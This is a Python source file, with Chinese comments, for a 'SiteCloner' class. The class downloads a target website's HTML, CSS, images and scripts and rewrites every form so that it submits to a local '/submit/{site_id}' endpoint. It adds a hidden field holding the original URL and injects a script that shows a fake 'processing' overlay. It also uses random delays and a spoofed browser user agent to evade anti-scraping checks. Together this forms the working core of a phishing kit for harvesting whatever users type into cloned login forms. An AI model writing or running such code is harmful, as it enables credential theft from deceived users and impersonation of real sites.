import os
import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse
import time
import random
import config

class SiteCloner:
    def __init__(self, base_dir='static/cloned_sites'):
        self.base_dir = base_dir
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        # 从配置加载下载资源设置
        self.download_resources = config.DOWNLOAD_RESOURCES
        self.request_timeout = config.REQUEST_TIMEOUT
        self.min_delay = config.MIN_REQUEST_DELAY
        self.max_delay = config.MAX_REQUEST_DELAY
        
    def _make_request(self, url, stream=False):
        """发送请求并添加随机延迟"""
        delay = random.uniform(self.min_delay, self.max_delay)
        time.sleep(delay)  # 随机延迟，避免触发反爬
        try:
            return self.session.get(url, stream=stream, timeout=self.request_timeout)
        except Exception as e:
            print(f"请求失败: {url}, 错误: {str(e)}")
            return None
            
    def _get_resource_path(self, url, site_id):
        """根据URL生成本地资源路径"""
        parsed = urlparse(url)
        path = parsed.path
        if not path or path.endswith('/'):
            path += 'index.html'
        
        # 处理查询参数
        if parsed.query:
            query_hash = str(hash(parsed.query))[-8:]
            # 确保path有扩展名
            if '.' in path:
                path = f"{path.rsplit('.', 1)[0]}_{query_hash}.{path.rsplit('.', 1)[1]}"
            else:
                path = f"{path}_{query_hash}.html"
            
        return os.path.join(self.base_dir, site_id, parsed.netloc, path.lstrip('/'))
        
    def _download_resource(self, url, site_id):
        """下载单个资源文件"""
        if not url or url.startswith(('data:', 'javascript:', '#')):
            return url
            
        # 如果禁用资源下载，直接返回原始URL
        if not self.download_resources:
            return url
            
        local_path = self._get_resource_path(url, site_id)
        os.makedirs(os.path.dirname(local_path), exist_ok=True)
        
        # 检查文件是否已存在
        if os.path.exists(local_path):
            return f"/static/cloned_sites/{site_id}/{urlparse(url).netloc}/{urlparse(url).path.lstrip('/')}"
            
        response = self._make_request(url, stream=True)
        if not response or response.status_code != 200:
            return url
            
        # 保存资源
        with open(local_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
                
        return f"/static/cloned_sites/{site_id}/{urlparse(url).netloc}/{urlparse(url).path.lstrip('/')}"
        
    def _process_css(self, css_content, base_url, site_id):
        """处理CSS文件中的URL引用"""
        if not self.download_resources:
            return css_content
            
        url_pattern = re.compile(r'url\([\'"]?(.*?)[\'"]?\)')
        
        def replace_url(match):
            resource_url = match.group(1)
            if resource_url.startswith(('data:', 'http:', 'https:')):
                absolute_url = resource_url
            else:
                absolute_url = urljoin(base_url, resource_url)
            
            local_url = self._download_resource(absolute_url, site_id)
            return f'url({local_url})'
            
        return url_pattern.sub(replace_url, css_content)
        
    def clone_site(self, target_url):
        """克隆整个网站"""
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
            
        response = self._make_request(target_url)
        if not response or response.status_code != 200:
            return None
            
        # 创建站点ID和目录
        site_id = urlparse(target_url).netloc.replace('.', '_')
        site_dir = os.path.join(self.base_dir, site_id)
        os.makedirs(site_dir, exist_ok=True)
        
        # 解析HTML
        soup = BeautifulSoup(response.text, 'lxml')
        
        # 处理CSS文件
        if self.download_resources:
            for link in soup.find_all('link', rel='stylesheet'):
                if link.get('href'):
                    css_url = urljoin(target_url, link['href'])
                    css_response = self._make_request(css_url)
                    if css_response and css_response.status_code == 200:
                        # 处理CSS文件中的资源引用
                        processed_css = self._process_css(css_response.text, css_url, site_id)
                        local_css_path = self._get_resource_path(css_url, site_id)
                        os.makedirs(os.path.dirname(local_css_path), exist_ok=True)
                        with open(local_css_path, 'w', encoding='utf-8') as f:
                            f.write(processed_css)
                        link['href'] = f"/static/cloned_sites/{site_id}/{urlparse(css_url).netloc}/{urlparse(css_url).path.lstrip('/')}"
        
        # 处理图片
        if self.download_resources:
            for img in soup.find_all('img'):
                if img.get('src'):
                    img_url = urljoin(target_url, img['src'])
                    local_img_path = self._download_resource(img_url, site_id)
                    img['src'] = local_img_path
        
        # 处理脚本
        if self.download_resources:
            for script in soup.find_all('script'):
                if script.get('src'):
                    script_url = urljoin(target_url, script['src'])
                    local_script_path = self._download_resource(script_url, site_id)
                    script['src'] = local_script_path
        
        # 修改表单
        for form in soup.find_all('form'):
            if form.get('action'):
                form['action'] = f'/submit/{site_id}'
            else:
                form['action'] = f'/submit/{site_id}'
            form['method'] = 'post'
            
            # 添加隐藏字段存储原始目标
            hidden_input = soup.new_tag('input')
            hidden_input['type'] = 'hidden'
            hidden_input['name'] = 'original_site'
            hidden_input['value'] = target_url
            form.append(hidden_input)
            
        # 注入表单拦截脚本
        intercept_script = soup.new_tag('script')
        intercept_script.string = """
            document.addEventListener('DOMContentLoaded', function() {
                var forms = document.getElementsByTagName('form');
                for(var i = 0; i < forms.length; i++) {
                    forms[i].addEventListener('submit', function(e) {
                        // 显示加载动画
                        var loadingDiv = document.createElement('div');
                        loadingDiv.style.position = 'fixed';
                        loadingDiv.style.top = '0';
                        loadingDiv.style.left = '0';
                        loadingDiv.style.width = '100%';
                        loadingDiv.style.height = '100%';
                        loadingDiv.style.backgroundColor = 'rgba(255,255,255,0.8)';
                        loadingDiv.style.display = 'flex';
                        loadingDiv.style.justifyContent = 'center';
                        loadingDiv.style.alignItems = 'center';
                        loadingDiv.style.zIndex = '9999';
                        
                        var spinner = document.createElement('div');
                        spinner.textContent = '正在处理...';
                        spinner.style.fontSize = '20px';
                        loadingDiv.appendChild(spinner);
                        
                        document.body.appendChild(loadingDiv);
                        
                        // 延迟提交表单
                        setTimeout(function() {
                            // 表单提交继续
                        }, 1500);
                    });
                }
            });
        """
        soup.head.append(intercept_script)
        
        # 保存修改后的HTML
        template_dir = os.path.join('templates', 'cloned_sites', site_id)
        os.makedirs(template_dir, exist_ok=True)
        with open(os.path.join(template_dir, 'index.html'), 'w', encoding='utf-8') as f:
            f.write(str(soup))
            
        return site_id 